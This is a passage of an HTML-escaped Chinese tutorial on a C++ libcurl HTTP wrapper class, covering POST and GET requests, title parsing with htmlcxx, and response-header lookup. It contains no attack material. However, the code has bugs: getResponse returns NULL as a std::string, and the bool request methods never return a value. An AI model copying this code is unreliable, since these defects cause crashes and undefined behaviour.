    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CURLOPT_FORBID_REUSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curl_easy_perform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_getinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLINFO_RESPONSE_CODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_responseCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;isRequested&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x03-post与get的区别&quot;&gt;0x03 POST与GET的区别&lt;/h2&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
 * post请求
 * @param data
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;postRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_POSTFIELDS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * get请求
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;POST比GET多两步操作，需要设置两个值&lt;/p&gt;

&lt;h2 id=&quot;0x04-获取标签内容---html解析&quot;&gt;0x04 获取标签内容 - HTML解析&lt;/h2&gt;

&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;htmlcxx&lt;/code&gt;库，安装命令：&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt-get install libhtmlcxx-dev&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;包含头文件：&lt;code class=&quot;highlighter-rouge&quot;&gt;#include &amp;lt;htmlcxx/html/ParserDom.h&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
 * 返回页面标题
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getTitle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;htmlcxx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ParserDom&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parserDom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htmlcxx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dom&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parserDom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parseTree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_responseBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htmlcxx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;begin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htmlcxx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tagName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 如果标签名为title&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;_title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 返回 title 标签内容&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x05-根据键名获取键值---搜集信息&quot;&gt;0x05 根据键名获取键值 - 搜集信息&lt;/h2&gt;

&lt;p&gt;主要是字符串的操作&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
 * 通过键名获取键值
 * @param Key
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size_type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;npos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pos2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_lineStr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x06-源代码&quot;&gt;0x06 源代码&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;http.h&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Created by payloads on 1/22/18.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#ifndef MYPROJECT_HTTP_H
#define MYPROJECT_HTTP_H
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;
#include &amp;lt;vector&amp;gt;
#include &amp;lt;regex&amp;gt;
#include &amp;lt;curl/curl.h&amp;gt;
#include &amp;lt;htmlcxx/html/ParserDom.h&amp;gt;
#include &amp;lt;sstream&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 设置请求地址以及端口&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 设置请求地址&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 设置端口&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// get 方法&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;postRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// post 方法&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addRequestHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getTitle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 获取标题&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 获取响应内容&lt;/span&gt;
